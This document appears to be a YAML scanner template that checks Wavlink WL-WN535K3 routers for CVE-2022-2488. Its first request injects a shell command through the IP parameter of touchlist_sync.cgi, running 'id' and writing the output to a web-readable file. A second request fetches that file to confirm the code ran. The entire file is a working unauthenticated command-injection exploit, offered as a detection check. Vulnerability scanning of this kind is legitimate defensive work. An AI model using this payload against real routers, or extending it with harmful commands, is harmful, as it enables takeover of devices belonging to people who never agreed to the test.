name: yaml-poc-wavlink-wl-wn535k3_firmware-unauthorized_access-CVE-2022-2488
binding: a2885870-326d-4e97-9a4b-db1949aa852e
detail:
    author: system_user
    links:
        - https://cxsecurity.com/cveshow/CVE-2022-2488/
        - https://github.com/1angx/webray.com.cn/blob/main/Wavlink/Wavlink%20touchlist_sync.cgi.md
        - https://vuldb.com/?id.204539
    vulnerability:
        id: 5394f4a1-85f7-4585-982b-daa9fe6de7dc
        level: critical
transport: http
set:
    filename: randomLowercase(6)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /cgi-bin/touchlist_sync.cgi?IP=;id>./{{filename}}.txt;
        expression: response.status == 500
    r1:
        request:
            cache: true
            method: GET
            path: /cgi-bin/{{filename}}.txt
        expression: response.status == 200 && response.body.bcontains(b"uid=") && response.body.bcontains(b"gid=")
expression: r0() && r1()
